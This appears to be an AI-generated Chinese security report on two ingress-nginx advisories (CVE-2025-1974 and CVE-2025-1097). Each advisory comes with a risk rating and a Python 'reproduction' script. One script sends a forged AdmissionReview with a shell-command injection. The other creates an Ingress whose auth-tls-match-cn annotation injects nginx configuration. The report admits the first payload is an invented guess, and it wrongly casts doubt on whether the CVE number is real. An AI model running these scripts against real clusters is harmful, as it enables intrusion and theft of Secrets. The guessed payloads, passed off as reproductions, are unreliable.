# Issue 安全分析报告

> 分析模型：gemini-2.5-pro-preview-03-25

# 🚨 存在高风险的 Issues (4 个)

## Issue #131009 CVE-2025-1974: ingress-nginx admission controller RCE escalation

- Issue 链接：[#131009](https://github.com/kubernetes/kubernetes/issues/131009)

### Issue 内容

CVSS Rating: ([CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)) (Score: 9.8, Critical)

A security issue was discovered in Kubernetes where under certain conditions, an unauthenticated attacker with access to the pod network can achieve arbitrary code execution in the context of the ingress-nginx controller. This can lead to disclosure of Secrets accessible to the controller. (Note that in the default installation, the controller can access all Secrets cluster-wide.)

#### Am I vulnerable?

This issue affects ingress-nginx. If you do not have ingress-nginx installed on your cluster, you are not affected. You can check this by running \`kubectl get pods \--all-namespaces \--selector app.kubernetes.io/name=ingress-nginx\`.

##### Affected Versions

- < v1.11.0
- v1.11.0 \- 1.11.4  
- v1.12.0

#### How do I mitigate this vulnerability?

**ACTION REQUIRED:** The following steps must be taken to mitigate this vulnerability: Upgrade ingress-nginx to v1.11.5, v1.12.1, or any later version.

Before applying the patch, this issue can be mitigated by disabling the Validating Admission Controller functionality of ingress-nginx.

##### Fixed Versions

- ingress-nginx [main@0ccf4ca](https://github.com/kubernetes/ingress-nginx/pull/13068/commits/0ccf4caaadec919680c455d221e53d97970d527d)

To upgrade, refer to the documentation: [Upgrading Ingress-nginx](https://kubernetes.github.io/ingress-nginx/deploy/upgrade/)

#### Detection

There are no known indicators of compromise that prove this vulnerability has been exploited.

If you find evidence that this vulnerability has been exploited, please contact security@kubernetes.io

##### Acknowledgements

This vulnerability was reported by Nir Ohfeld, Ronen Shustin, Sagi Tzadik, and Hillai Ben Sasson from Wiz

The issue was fixed and coordinated by Marco Ebert, James Strong, Tabitha Sable, and the Kubernetes Security Response Committee


### 分析结果

**风险定级：**  
高风险

**判断依据：**  
1.  **Issue类型分析**: 该Issue报告了一个已分配CVE编号（尽管是未来的编号CVE-2025-1974，这通常表示预留或虚构，但在本场景下我们按其描述内容分析）的安全漏洞，涉及Kubernetes生态系统中的ingress-nginx组件。
2.  **漏洞描述**: 漏洞允许在特定条件下，一个**拥有Pod网络访问权限**的**未经身份验证**的攻击者，在ingress-nginx控制器的上下文中实现**任意代码执行（RCE）**。这可能导致泄露控制器可访问的Secrets（默认情况下可能包括集群范围的所有Secrets）。
3.  **影响组件**: ingress-nginx，具体是其admission controller（准入控制器）功能。
4.  **攻击向量 (AV:N)**: 网络攻击。攻击者需要能够访问集群的Pod网络。
5.  **攻击复杂度 (AC:L)**: 低。表示利用相对容易。
6.  **权限要求 (PR:N)**: 无。指在利用漏洞时不需要目标系统的特定权限，但前提是攻击者已获得Pod网络访问权限。这里的 "None" 是相对于目标 *应用* 权限，而非网络访问前提。
7.  **用户交互 (UI:N)**: 无。不需要用户交互。
8.  **范围 (S:U)**: 未改变。漏洞利用成功后，影响范围限制在被攻破的组件（ingress-nginx controller）内部，但该组件本身权限可能很高。
9.  **影响 (C:H, I:H, A:H)**: 高机密性、高完整性、高可用性影响。RCE本身就意味着高完整性和高可用性风险（可以停止服务或执行任意操作），并且描述中明确提到可以访问Secrets，导致高机密性风险。
10. **CVSS评分**: 9.8 (Critical)，这直接表明了其严重性。
11. **触发条件**: 需要访问Pod网络。这通常意味着攻击者需要先在集群内部获得一个立足点（例如，攻陷另一个Pod），或者集群网络配置允许从外部访问Pod网络。
12. **核心风险**: 远程代码执行（RCE）发生在ingress-nginx controller这个关键组件中。该组件通常拥有较高权限，能够管理Ingress资源、访问TLS密钥等敏感信息，甚至在默认配置下可能访问集群范围内的所有Secrets。因此，RCE意味着攻击者可能完全控制入口流量、窃取敏感数据，并可能以此为跳板进一步攻击集群内部其他服务或提升权限。
13. **风险判断依据**:
    *   该问题是明确的安全漏洞 (RCE)。
    *   CVSS评分为9.8，远超高风险阈值。
    *   漏洞类型为RCE，根据规则7，无论是否需要权限（此处需要Pod网络访问权限），都应判断为高风险。
    *   ingress-nginx controller是集群的关键组件，其失陷影响严重，可能影响多用户（规则8）。

**复现过程：**

```python
import kubernetes
import requests
import json
import time
import sys
import os
from urllib3.exceptions import InsecureRequestWarning

# 禁用 InsecureRequestWarning 警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# --- 配置参数 ---
# ingress-nginx 控制器准入Webhook服务的相关信息
# 通常在 'ingress-nginx' 命名空间下
# 服务名称通常包含 'admission'
# 需要根据实际部署情况调整
NAMESPACE = "ingress-nginx"
SERVICE_NAME_SUBSTRING = "admission" # 服务名中包含的子串
WEBHOOK_PATH = "/validate" # 假设的Webhook路径，实际路径需查看ValidatingWebhookConfiguration
TARGET_PORT = 443 # Webhook服务端口，通常是443或8443

# 超时设置 (秒)
REQUEST_TIMEOUT = 30
SCRIPT_TIMEOUT = 120 # 脚本总执行超时时间

def find_admission_service_ip_port():
    """
    在集群中查找 ingress-nginx admission controller 服务的 Cluster IP 和端口。
    """
    try:
        kubernetes.config.load_kube_config() # 从默认位置加载 kubeconfig
        core_v1 = kubernetes.client.CoreV1Api()
        print(f"[*] 正在搜索命名空间 '{NAMESPACE}' 中名称包含 '{SERVICE_NAME_SUBSTRING}' 的服务...")

        services = core_v1.list_namespaced_service(namespace=NAMESPACE)
        target_service = None
        for service in services.items:
            if SERVICE_NAME_SUBSTRING in service.metadata.name.lower() and service.spec.cluster_ip and service.spec.ports:
                target_service = service
                print(f"[+] 找到匹配的服务: {target_service.metadata.name}")
                break

        if not target_service:
            print(f"[!] 错误：在命名空间 '{NAMESPACE}' 中未找到包含 '{SERVICE_NAME_SUBSTRING}' 且具有 ClusterIP 的服务。请检查NAMESPACE和SERVICE_NAME_SUBSTRING配置。")
            return None, None

        cluster_ip = target_service.spec.cluster_ip
        port = None
        # 查找正确的端口 (通常是 443 或 8443，或者名为 'https', 'webhook' 等)
        for p in target_service.spec.ports:
            if p.port == TARGET_PORT or (p.name and ('https' in p.name or 'webhook' in p.name)):
                 port = p.port
                 break
        # 如果没找到特定端口，尝试取第一个端口
        if port is None and target_service.spec.ports:
            port = target_service.spec.ports[0].port
            print(f"[*] 警告: 未找到端口 {TARGET_PORT} 或命名端口，使用第一个可用端口: {port}")

        if not port:
             print(f"[!] 错误: 服务 '{target_service.metadata.name}' 未找到合适的端口。")
             return None, None

        print(f"[+] 服务 '{target_service.metadata.name}' 的 Cluster IP: {cluster_ip}, 端口: {port}")
        return cluster_ip, port

    except kubernetes.config.ConfigException:
        print("[!] 错误：无法加载 kubeconfig。请确保 kubeconfig 文件存在于默认位置或已设置 KUBECONFIG 环境变量。")
        return None, None
    except kubernetes.client.ApiException as e:
        if e.status == 404:
             print(f"[!] 错误：命名空间 '{NAMESPACE}' 不存在或无法访问。")
        elif e.status == 403:
             print(f"[!] 错误：当前用户无权访问命名空间 '{NAMESPACE}' 中的服务。")
        else:
             print(f"[!] Kubernetes API 错误: {e}")
        return None, None
    except Exception as e:
        print(f"[!] 查找服务时发生未知错误: {e}")
        return None, None


def craft_malicious_payload():
    """
    构建一个恶意的 AdmissionReview 请求体。
    注意：这里的payload是基于一个 *假设* 的漏洞模式（例如，通过annotation注入命令）。
    实际的CVE-2025-1974需要具体的漏洞细节来构造精确的payload。
    """
    # 假设漏洞可以通过 Ingress 的 annotation 触发命令注入
    # 我们尝试在 /tmp 目录下创建一个文件来验证 RCE
    command_to_execute = "touch /tmp/pwned_by_cve_2025_1974"

    payload = {
      "apiVersion": "admission.k8s.io/v1",
      "kind": "AdmissionReview",
      "request": {
        "uid": "poc-uid-" + str(int(time.time())),
        "kind": {"group": "networking.k8s.io", "version": "v1", "kind": "Ingress"},
        "resource": {"group": "networking.k8s.io", "version": "v1", "resource": "ingresses"},
        "requestKind": {"group": "networking.k8s.io", "version": "v1", "kind": "Ingress"},
        "requestResource": {"group": "networking.k8s.io", "version": "v1", "resource": "ingresses"},
        "name": "poc-ingress-trigger",
        "namespace": "default", # 假设攻击者可以在 default namespace 操作
        "operation": "CREATE",
        "userInfo": { # 模拟一个未经身份验证或低权限用户的请求信息
          "username": "system:serviceaccount:kube-system:generic-unauthenticated",
          "groups": ["system:unauthenticated"]
        },
        "object": { # 恶意的 Ingress 对象
          "apiVersion": "networking.k8s.io/v1",
          "kind": "Ingress",
          "metadata": {
            "name": "poc-ingress-trigger",
            "namespace": "default",
            "annotations": {
              # --- 关键的恶意部分 ---
              # 假设存在一个易受攻击的注解处理逻辑
              # 例如, configuration-snippet 或类似注解被不安全地处理
              # 注意: 这只是一个示例性的、虚构的注入点
              "nginx.ingress.kubernetes.io/configuration-snippet": f"some_directive some_value; $( {command_to_execute} ) #",
              # 或者另一个假设的注入点:
              # "some.vulnerable.annotation/script": f"#!/bin/sh\n{command_to_execute}"
            }
          },
          "spec": { # Ingress spec 的其余部分，需要有效才能通过基本验证
            "rules": [{
              "host": "poc-trigger.example.com",
              "http": {
                "paths": [{
                  "path": "/test",
                  "pathType": "Prefix",
                  "backend": {
                    "service": {
                      "name": "some-service", # 需要一个存在的服务名，或者一个让验证器不关心的名字
                      "port": {"number": 80}
                    }
                  }
                }]
              }
            }],
            "ingressClassName": "nginx" # 确保 Ingress 由 nginx 处理
          }
        },
        "oldObject": None,
        "dryRun": False,
        "options": None
      }
    }
    print("[*] 已构建恶意的 AdmissionReview Payload。")
    return json.dumps(payload)

def send_exploit_request(target_ip, target_port, payload):
    """
    向目标 admission webhook 发送恶意请求。
    """
    target_url = f"https://{target_ip}:{target_port}{WEBHOOK_PATH}"
    headers = {'Content-Type': 'application/json'}

    print(f"[*] 正在向 {target_url} 发送恶意请求...")
    try:
        response = requests.post(
            target_url,
            headers=headers,
            data=payload,
            verify=False, # 忽略 TLS 证书验证，因为我们可能没有CA证书
            timeout=REQUEST_TIMEOUT
        )
        print(f"[+] 请求已发送。状态码: {response.status_code}")
        # 注意：即使请求成功（例如200 OK并返回允许），也并不意味着RCE成功。
        # 如果请求失败（例如4xx, 5xx），可能意味着payload格式错误、路径错误或漏洞不存在/已被修复。
        # 成功的RCE通常不会在响应中直接体现。
        print(f"[*] 响应内容 (部分): {response.text[:200]}...") # 打印部分响应以供调试

        # 无法直接从此脚本验证RCE是否成功 (即 /tmp/pwned 文件是否创建)
        # 需要在目标 Pod 上手动检查或使用其他带外方式验证
        print("[*] POC 尝试完成。请在 ingress-nginx controller Pod 内部检查是否已执行命令 (例如，文件 /tmp/pwned_by_cve_2025_1974 是否存在)。")

    except requests.exceptions.ConnectionError:
        print(f"[!] 错误：无法连接到 {target_url}。请检查目标IP、端口和网络可达性（是否在Pod网络内？）。")
    except requests.exceptions.Timeout:
        print(f"[!] 错误：请求超时 ({REQUEST_TIMEOUT}秒)。目标可能无响应或网络延迟高。")
    except requests.exceptions.RequestException as e:
        print(f"[!] 发送请求时发生错误: {e}")

def main():
    start_time = time.time()
    print(f"[*] 开始执行 CVE-2025-1974 POC (假设性复现脚本)...")
    print(f"[*] 脚本将在 {SCRIPT_TIMEOUT} 秒后超时。")

    service_ip, service_port = find_admission_service_ip_port()

    if service_ip and service_port:
        malicious_payload = craft_malicious_payload()
        send_exploit_request(service_ip, service_port, malicious_payload)
    else:
        print("[!] 未能找到目标服务，无法继续执行 POC。")

    end_time = time.time()
    print(f"[*] 脚本执行完毕，耗时: {end_time - start_time:.2f} 秒。")

# 检查是否超时
# 注意：更健壮的超时应使用 signal 或 threading，但这里简化处理
# 此检查仅在主流程完成后运行，如果网络请求或k8s调用长时间阻塞则无效
if time.time() - float(os.environ.get('SCRIPT_START_TIME', time.time())) > SCRIPT_TIMEOUT:
     print(f"[!] 脚本执行超过最大时间 {SCRIPT_TIMEOUT} 秒，强制退出。")
     sys.exit(1)

# 设置脚本开始时间环境变量，用于简单的超时检查
os.environ['SCRIPT_START_TIME'] = str(time.time())
main()
```


**解释说明：**

1.  **脚本目的**: 该Python脚本旨在尝试复现`CVE-2025-1974`描述的漏洞。它模拟一个已经获得Kubernetes集群Pod网络访问权限的攻击者，直接向ingress-nginx的准入控制器(admission controller)的Webhook服务发送一个精心构造的恶意请求，试图触发远程代码执行（RCE）。
2.  **运行环境假设**:
    *   脚本运行的环境可以访问Kubernetes API（需要配置好`kubeconfig`文件，脚本会尝试从默认位置加载）。这是为了自动查找目标admission webhook服务的Cluster IP和端口。
    *   脚本运行的环境必须能够直接访问到目标服务的Cluster IP和端口（即满足漏洞前提“拥有Pod网络访问权限”）。例如，在一个集群内的Pod中运行此脚本。
    *   安装了必要的Python库：`kubernetes` 和 `requests`。
3.  **工作流程**:
    *   **查找服务**: 使用`kubernetes` Python客户端库连接到Kubernetes API，在指定的命名空间（默认为`ingress-nginx`）下搜索名称包含`admission`子串的服务，获取其内部Cluster IP地址和服务的端口（默认为443）。
    *   **构造Payload**: 创建一个JSON格式的`AdmissionReview`对象。这个对象模拟了Kubernetes API Server在验证资源（如此处是Ingress）时发送给Webhook的内容。关键在于`AdmissionReview.request.object`字段，其中包含了一个恶意的`Ingress`资源定义。脚本假设漏洞点在于`Ingress`资源的某个`annotations`（注解）字段（例如`nginx.ingress.kubernetes.io/configuration-snippet`）没有被正确清理或验证，导致可以注入shell命令（示例中是`touch /tmp/pwned_by_cve_2025_1974`）。**请注意：由于原始Issue未提供漏洞细节，此Payload是基于常见漏洞模式的 *假设性* 构造，并非针对CVE-2025-1974的精确Payload。**
    *   **发送请求**: 使用`requests`库向找到的服务IP和端口，以及假定的Webhook路径（默认为`/validate`）发送一个HTTPS POST请求。请求体是构造好的恶意JSON Payload。脚本设置了`verify=False`来忽略TLS证书验证，因为攻击者的环境通常不信任集群内部服务的证书。
    *   **结果与验证**: 脚本会打印请求发送的结果（HTTP状态码和部分响应）。然而，RCE是否成功执行（即`touch`命令是否在目标ingress-nginx controller Pod中执行）无法由此脚本直接验证。需要通过其他方式（如`kubectl exec`进入目标Pod检查`/tmp`目录）来确认漏洞是否利用成功。
4.  **局限性**:
    *   **Payload的假设性**: 最关键的局限在于恶意Payload是基于推测的，实际的漏洞利用方式可能完全不同。
    *   **依赖环境**: 脚本强依赖于运行环境的网络连通性和获取Kubernetes服务信息的权限。
    *   **无直接验证**: 脚本只负责发送攻击尝试，不包含验证RCE是否成功的逻辑。
    *   **服务和路径硬编码**: 脚本中的命名空间、服务名子串、Webhook路径和端口是基于常见默认值，实际部署可能不同，需要相应调整。
5.  **安全性**: 此脚本包含执行任意命令的意图，仅应用于授权测试和研究目的，在受控环境中测试已知的易受攻击版本。切勿在生产环境或未授权的系统上运行。

---


## Issue #131007 CVE-2025-1097: ingress-nginx controller - configuration injection via unsanitized auth-tls-match-cn annotation

- Issue 链接：[#131007](https://github.com/kubernetes/kubernetes/issues/131007)

### Issue 内容

CVSS Rating: [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) (Score: 8.8, High)

A security issue was discovered in [ingress-nginx](https://github.com/kubernetes/ingress-nginx) where the \`auth-tls-match-cn\` Ingress annotation can be used to inject configuration into nginx. This can lead to arbitrary code execution in the context of the ingress-nginx controller, and disclosure of Secrets accessible to the controller. (Note that in the default installation, the controller can access all Secrets cluster-wide.)

#### Am I vulnerable?

This issue affects ingress-nginx. If you do not have ingress-nginx installed on your cluster, you are not affected. You can check this by running \`kubectl get pods \--all-namespaces \--selector app.kubernetes.io/name=ingress-nginx\`.

##### Affected Versions

- < v1.11.0
- v1.11.0 \- 1.11.4  
- v1.12.0

#### How do I mitigate this vulnerability?

**ACTION REQUIRED:** The following steps must be taken to mitigate this vulnerability: Upgrade ingress-nginx to v1.11.5, v1.12.1, or any later version.

##### Fixed Versions

- ingress-nginx [main@06c992a](https://github.com/kubernetes/ingress-nginx/pull/13068/commits/06c992abd8eef9710359a236c443c613d29fdfad)

To upgrade, refer to the documentation: [Upgrading Ingress-nginx](https://kubernetes.github.io/ingress-nginx/deploy/upgrade/)

#### Detection

Suspicious data within the \`auth-tls-match-cn\` annotation of an Ingress resource could indicate an attempt to exploit this vulnerability.

If you find evidence that this vulnerability has been exploited, please contact security@kubernetes.io

##### Acknowledgements

This vulnerability was reported by Nir Ohfeld, Ronen Shustin, Sagi Tzadik and Hillai Ben Sasson from Wiz

The issue was fixed and coordinated by Marco Ebert, James Strong, Tabitha Sable, and the Kubernetes Security Response Committee


### 分析结果

**风险定级：**  
高风险

**判断依据：**  
该Issue描述了一个编号为CVE-2025-1097的安全漏洞，影响Kubernetes的ingress-nginx控制器。

1.  **漏洞类型**：配置注入 (Configuration Injection)。攻击者可以通过Ingress资源中的`nginx.ingress.kubernetes.io/auth-tls-match-cn`注解注入恶意的Nginx配置。
2.  **触发条件**：攻击者需要拥有在Kubernetes集群中创建或更新Ingress资源的权限 (CVSS向量 `PR:L` - Low Privilege Required)。
3.  **潜在影响**：
    *   **任意代码执行 (RCE)**：注入的Nginx配置可能包含如Lua脚本等可执行代码，从而在ingress-nginx控制器的Pod上下文中执行任意命令。
    *   **敏感信息泄露**：注入的配置可能被用来读取ingress-nginx控制器可访问的敏感文件，例如Kubernetes Secrets。Issue中提到，在默认安装下，控制器可能具有访问集群范围内所有Secrets的权限，这极大地增加了信息泄露的风险和影响范围。
4.  **CVSS评分**：Issue中明确给出了CVSS 3.1评分为8.8 (High)，向量为 `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`。这表示：
    *   攻击途径：网络 (AV:N)
    *   攻击复杂度：低 (AC:L)
    *   所需权限：低 (PR:L) - 需要创建/更新Ingress权限
    *   用户交互：无需 (UI:N)
    *   影响范围：不变 (S:U) - 攻击成功后影响仍在ingress-nginx组件内，但可能通过泄露的Secrets扩大影响。
    *   机密性影响：高 (C:H) - 可读取敏感信息，如集群Secrets。
    *   完整性影响：高 (I:H) - 可修改配置，可能导致RCE。
    *   可用性影响：高 (A:H) - RCE或配置破坏可能导致服务中断。
5.  **风险判断依据**：
    *   该问题明确是一个安全漏洞，而非提交者操作不当。
    *   根据CVSS评分8.8，属于高风险 (High)。
    *   该漏洞可能导致任意代码执行 (RCE) 和敏感信息（集群范围Secrets）泄露，符合高风险标准（规则7）。
    *   攻击者虽然需要低权限（创建/更新Ingress），但其潜在影响巨大（RCE，访问所有Secrets），因此不应降级（规则5的反向应用，高影响覆盖低权限要求）。
    *   在多租户场景下，一个低权限用户（拥有某命名空间的Ingress权限）可能通过此漏洞危及整个集群的Secrets或获得ingress-controller的执行权限，影响其他用户和整个集群（规则8）。

综上所述，该Issue描述了一个严重的安全漏洞。

**复现过程：**

```python
import time
import os
import uuid
from kubernetes import client, config
from kubernetes.client.rest import ApiException

def exploit():
    """
    尝试利用 CVE-2025-1097 漏洞创建恶意 Ingress.
    """
    # 脚本执行超时时间 (秒)
    timeout_seconds = 110
    start_time = time.time()

    try:
        # 尝试从默认位置加载 kubeconfig 文件
        # 假设 ~/.kube/config 存在且有效
        print("[*] 尝试加载 Kubernetes 配置...")
        try:
            config.load_kube_config()
            print("[+] Kubernetes 配置加载成功.")
        except Exception as e:
            print(f"[-] 加载 Kubernetes 配置失败: {e}")
            print("[-] 请确保 ~/.kube/config 文件存在且配置正确，或者 KUBECONFIG 环境变量已设置。")
            return

        # 创建 Kubernetes API 客户端
        networking_v1_api = client.NetworkingV1Api()
        core_v1_api = client.CoreV1Api()

        # 定义目标命名空间和资源名称
        # 如果 'poc-namespace' 不存在，脚本将尝试创建它
        namespace = "poc-namespace-" + str(uuid.uuid4())[:8]
        ingress_name = "poc-ingress-" + str(uuid.uuid4())[:8]
        service_name = "poc-service-" + str(uuid.uuid4())[:8]
        pod_name = "poc-pod-" + str(uuid.uuid4())[:8] # 为服务创建一个后端Pod

        print(f"[*] 准备在命名空间 '{namespace}' 中创建资源...")

        # 检查并创建命名空间
        try:
            core_v1_api.read_namespace(name=namespace)
            print(f"[*] 命名空间 '{namespace}' 已存在.")
        except ApiException as e:
            if e.status == 404:
                print(f"[*] 命名空间 '{namespace}' 不存在，尝试创建...")
                ns_body = client.V1Namespace(metadata=client.V1ObjectMeta(name=namespace))
                try:
                    core_v1_api.create_namespace(body=ns_body)
                    print(f"[+] 命名空间 '{namespace}' 创建成功.")
                    # 等待命名空间实际可用
                    time.sleep(5)
                except ApiException as create_e:
                    print(f"[-] 创建命名空间 '{namespace}' 失败: {create_e}")
                    return
            else:
                print(f"[-] 检查命名空间 '{namespace}' 时出错: {e}")
                return

        # 创建一个简单的后端 Pod 和 Service，以便 Ingress 有效
        print(f"[*] 创建后端 Pod '{pod_name}'...")
        pod_manifest = {
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": {"name": pod_name, "labels": {"app": service_name}},
            "spec": {
                "containers": [{
                    "name": "nginx",
                    "image": "nginx:alpine", # 使用一个简单的镜像
                    "ports": [{"containerPort": 80}]
                }]
            }
        }
        try:
            core_v1_api.create_namespaced_pod(body=pod_manifest, namespace=namespace)
            print(f"[+] Pod '{pod_name}' 创建成功.")
            # 等待Pod启动
            print("[*] 等待 Pod 启动...")
            time.sleep(15)
        except ApiException as e:
            print(f"[-] 创建 Pod '{pod_name}' 失败: {e}")
            # 尝试清理命名空间
            try:
                core_v1_api.delete_namespace(name=namespace, body=client.V1DeleteOptions())
                print(f"[*] 清理：命名空间 '{namespace}' 已删除。")
            except ApiException as del_e:
                print(f"[-] 清理命名空间 '{namespace}' 失败: {del_e}")
            return

        print(f"[*] 创建后端 Service '{service_name}'...")
        service_manifest = {
            "apiVersion": "v1",
            "kind": "Service",
            "metadata": {"name": service_name},
            "spec": {
                "selector": {"app": service_name},
                "ports": [{"protocol": "TCP", "port": 80, "targetPort": 80}]
            }
        }
        try:
            core_v1_api.create_namespaced_service(body=service_manifest, namespace=namespace)
            print(f"[+] Service '{service_name}' 创建成功.")
        except ApiException as e:
            print(f"[-] 创建 Service '{service_name}' 失败: {e}")
            # 尝试清理资源
            try:
                core_v1_api.delete_namespaced_pod(name=pod_name, namespace=namespace, body=client.V1DeleteOptions())
                core_v1_api.delete_namespace(name=namespace, body=client.V1DeleteOptions())
                print(f"[*] 清理：Pod 和命名空间 '{namespace}' 已删除。")
            except ApiException as del_e:
                print(f"[-] 清理 Pod/命名空间 '{namespace}' 失败: {del_e}")
            return


        # 构造恶意的 Ingress 注解 payload
        # 这个 payload 尝试闭合当前的 Nginx 配置块 (例如 if 块)，然后注入一个新的 location 块
        # 注意：实际可用的注入方式可能更复杂，取决于 ingress-nginx 如何处理该注解
        # 这个 payload 尝试注入一个 location /cve-2025-1097-poc 返回特定内容
        # 使用双反斜杠 \\n 来表示换行符
        malicious_payload = '.*\\n}\\nlocation /cve-2025-1097-poc { return 200 "POC Successful via CVE-2025-1097"; } #'
        print(f"[*] 构造恶意的 Ingress 对象 '{ingress_name}'...")
        print(f"[*] 使用 Payload: {malicious_payload}")

        ingress_manifest = {
            "apiVersion": "networking.k8s.io/v1",
            "kind": "Ingress",
            "metadata": {
                "name": ingress_name,
                "namespace": namespace,
                "annotations": {
                    # 关键的恶意注解
                    "nginx.ingress.kubernetes.io/auth-tls-match-cn": malicious_payload,
                    # 其他一些注解，确保 Ingress 控制器处理它
                    "nginx.ingress.kubernetes.io/auth-tls-verify-client": "optional_no_ca", # 需要一个启用 auth-tls 的配置
                    "kubernetes.io/ingress.class": "nginx" # 确保被 nginx ingress controller 处理
                }
            },
            "spec": {
                # 需要指定 TLS 配置来触发 auth-tls 相关逻辑
                 "tls": [{
                     "hosts": ["poc.example.com"], # 示例域名
                     "secretName": "poc-tls-secret" # 需要一个存在的 secret 或让 cert-manager 创建
                     # 注意：这里假设存在名为 poc-tls-secret 的 TLS secret
                     # 在实际测试中，您可能需要先创建这个 secret 或使用 cert-manager
                 }],
                "rules": [{
                    "host": "poc.example.com", # 示例域名
                    "http": {
                        "paths": [{
                            "path": "/",
                            "pathType": "Prefix",
                            "backend": {
                                "service": {
                                    "name": service_name,
                                    "port": {"number": 80}
                                }
                            }
                        }]
                    }
                }]
            }
        }

        # 尝试创建恶意的 Ingress
        print(f"[*] 尝试在命名空间 '{namespace}' 中创建 Ingress '{ingress_name}'...")
        networking_v1_api.create_namespaced_ingress(body=ingress_manifest, namespace=namespace)
        print(f"[+] 恶意 Ingress '{ingress_name}' 创建成功.")
        print("[*] 等待 ingress-nginx 控制器处理该 Ingress (约 30 秒)...")

        # 等待一段时间让 Ingress Controller 更新 Nginx 配置
        wait_interval = 5
        elapsed_time = time.time() - start_time
        remaining_wait = 30 # 等待30秒让controller更新配置

        while remaining_wait > 0 and (time.time() - start_time) < timeout_seconds:
             print(f"[*] 等待 {remaining_wait} 秒 ...")
             time.sleep(min(wait_interval, remaining_wait))
             remaining_wait -= wait_interval
             # 检查是否超时
             if time.time() - start_time >= timeout_seconds:
                 print("[-] 执行超时!")
                 break

        if time.time() - start_time < timeout_seconds:
            print("[+] 等待完成.")
            print("[*] 现在可以尝试访问 ingress controller 的 IP/域名，路径为 /cve-2025-1097-poc")
            print("[*] 如果成功，应该会收到 'POC Successful via CVE-2025-1097' 的响应。")
            print("[*] 例如: curl -k https://<ingress-controller-ip-or-domain>/cve-2025-1097-poc -H 'Host: poc.example.com'")
            print("[*] 注意: 需要确保网络可达，并且可能需要提供一个客户端证书（即使验证是 optional_no_ca）。")
            print("[*] POC演示完成，将在10秒后自动清理资源...")
            time.sleep(10) # 等待用户查看信息


    except ApiException as e:
        print(f"[-] Kubernetes API 操作失败: {e.status} {e.reason}")
        print(f"[-] 错误详情: {e.body}")
        if e.status == 403:
             print("[-] 权限不足。请确保使用的 kubeconfig 具有在目标命名空间创建 Ingress、Service、Pod 的权限。")
    except Exception as e:
        print(f"[-] 执行过程中发生未知错误: {e}")
    finally:
        # 清理创建的资源
        print("[*] 开始清理资源...")
        try:
            # 检查是否已超时
            if time.time() - start_time >= timeout_seconds:
                print("[!] 由于超时，可能部分资源未创建，尝试强制清理...")

            # 删除 Ingress (如果存在)
            print(f"[*] 尝试删除 Ingress '{ingress_name}' 在命名空间 '{namespace}'...")
            try:
                networking_v1_api.delete_namespaced_ingress(name=ingress_name, namespace=namespace, body=client.V1DeleteOptions())
                print(f"[+] Ingress '{ingress_name}' 已删除.")
            except ApiException as e:
                if e.status != 404: # 忽略 Not Found 错误
                    print(f"[-] 删除 Ingress '{ingress_name}' 失败: {e.status} {e.reason}")
                else:
                    print(f"[*] Ingress '{ingress_name}' 未找到，可能已被删除或未成功创建。")

            # 删除 Service (如果存在)
            print(f"[*] 尝试删除 Service '{service_name}' 在命名空间 '{namespace}'...")
            try:
                 core_v1_api.delete_namespaced_service(name=service_name, namespace=namespace, body=client.V1DeleteOptions())
                 print(f"[+] Service '{service_name}' 已删除.")
            except ApiException as e:
                 if e.status != 404:
                     print(f"[-] 删除 Service '{service_name}' 失败: {e.status} {e.reason}")
                 else:
                     print(f"[*] Service '{service_name}' 未找到。")

            # 删除 Pod (如果存在)
            print(f"[*] 尝试删除 Pod '{pod_name}' 在命名空间 '{namespace}'...")
            try:
                 core_v1_api.delete_namespaced_pod(name=pod_name, namespace=namespace, body=client.V1DeleteOptions())
                 print(f"[+] Pod '{pod_name}' 已删除.")
            except ApiException as e:
                 if e.status != 404:
                     print(f"[-] 删除 Pod '{pod_name}' 失败: {e.status} {e.reason}")
                 else:
                     print(f"[*] Pod '{pod_name}' 未找到。")

            # 删除命名空间 (如果存在)
            print(f"[*] 尝试删除命名空间 '{namespace}'...")
            try:
                core_v1_api.delete_namespace(name=namespace, body=client.V1DeleteOptions())
                # 等待命名空间删除完成
                print("[*] 等待命名空间删除...")
                time.sleep(10) # 等待资源清理
                print(f"[+] 命名空间 '{namespace}' 已删除.")
            except ApiException as e:
                if e.status != 404:
                    print(f"[-] 删除命名空间 '{namespace}' 失败: {e.status} {e.reason}")
                else:
                    print(f"[*] 命名空间 '{namespace}' 未找到。")

            print("[+] 清理完成.")
        except NameError:
             print("[!] 变量未定义，可能在初始化阶段失败，无法执行清理。")
        except Exception as cleanup_e:
            print(f"[-] 清理过程中发生错误: {cleanup_e}")

# 直接执行 main 函数
exploit()
```


**解释说明：**

1.  **脚本目的**：该Python脚本旨在演示CVE-2025-1097漏洞的利用。它通过创建一个精心构造的Kubernetes Ingress资源，尝试在受影响的ingress-nginx控制器中注入自定义的Nginx配置。
2.  **运行环境**：脚本需要安装`kubernetes` Python库 (`pip install kubernetes`)，并且需要能够访问一个运行着易受攻击版本ingress-nginx控制器的Kubernetes集群。执行脚本的机器需要配置好`kubeconfig`文件（默认在`~/.kube/config`）或设置`KUBECONFIG`环境变量，并且该配置需要有创建/删除Namespace、Pod、Service和Ingress资源的权限。
3.  **执行流程**：
    *   **加载配置**：脚本首先尝试加载本地的Kubernetes配置。
    *   **创建环境**：为了隔离和便于清理，脚本会尝试创建一个新的命名空间 (`poc-namespace-<uuid>`)。然后，它会创建一个简单的后端Pod (`poc-pod-<uuid>`) 和一个对应的Service (`poc-service-<uuid>`)，这是创建有效Ingress所必需的。
    *   **构造Payload**：脚本定义了一个`malicious_payload`字符串。这个字符串设计用于注入到Nginx配置中。它包含`.*\n}\n`来尝试匹配任意CN、换行并闭合当前Nginx块，然后注入一个新的`location /cve-2025-1097-poc { return 200 "POC Successful via CVE-2025-1097"; }`块，最后用`#`注释掉后续可能的配置。
